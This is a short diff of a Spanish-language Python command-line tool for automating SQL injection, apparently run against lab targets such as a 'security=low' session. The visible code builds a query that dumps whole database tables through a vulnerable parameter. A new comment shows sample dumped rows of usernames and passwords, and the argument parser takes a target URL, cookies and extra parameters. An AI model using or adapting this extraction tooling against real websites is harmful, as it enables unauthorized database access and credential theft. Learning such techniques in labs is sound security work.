@@ -533,6 +533,7 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
             if columnas and columnas[0]:
                 cols_query = ', '.join(columnas)
                 # Usar separador especial para parsear filas y columnas
+                # Devuelve algo como 1||admin||1234<<ROW>>2||jorge||password<<ROW>>3||pepe||12345
                 query = f"SELECT group_concat(concat_ws('||', {cols_query}) SEPARATOR '<<ROW>>') FROM {bbdd}.{tabla}"
                 res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
                 
@@ -578,6 +579,7 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
 
 
 def parse_args():
+    
 
     man = """
     Herramienta de Automatización SQLi - Jorge Matesanz
@@ -590,7 +592,8 @@ def parse_args():
         -c, --cookies    Cookies HTTP (ej: 'PHPSESSID=abc123;user=admin;security=low')
         -e, --extra      Parámetros extra necesarios para hacer la petición (ej: 'Submit=Submit,email=example@example.com')
     """
-    parser = argparse.ArgumentParser(description="Herramienta de Automatización SQLi - Jorge Matesanz", epilog=man, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser = argparse.ArgumentParser(description="Herramienta de Automatización SQLi - Jorge Matesanz", epilog=man, 
+                                     formatter_class=argparse.RawDescriptionHelpFormatter)
 
     # 1. Argumento Obligatorio - url
     parser.add_argument("-u", "--url", dest="target_url", required=True, help="URL objetivo (ej: http://sitio.com/news.php)")
